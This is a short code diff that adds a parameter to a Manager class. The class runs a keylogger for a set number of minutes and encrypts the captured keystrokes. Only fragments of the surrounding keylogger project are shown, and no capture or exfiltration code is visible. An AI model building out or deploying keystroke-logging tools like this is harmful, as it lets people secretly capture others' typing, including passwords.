@@ -91,7 +91,7 @@ class EncryptorAndDecryptor:
 
 
 class Manager:
-    def __init__(self, time_to_run):
+    def __init__(self, time_to_run, bool_decrypt_or_encrypt):
         self.time_to_run = time_to_run  # must be in minutes...it'll then iterate through this for 60 second intervals!
         self.run_key_logger()
 
@@ -99,7 +99,6 @@ class Manager:
         kl = Key_loger(self.time_to_run)
         logged_data = kl.stop_after_one_minute() # iterates through one at a time
 
-        
         # #encrypt and write encrypted data
         encryptor = EncryptorAndDecryptor(logged_data)
         encrypted_data = encryptor.encrypt()
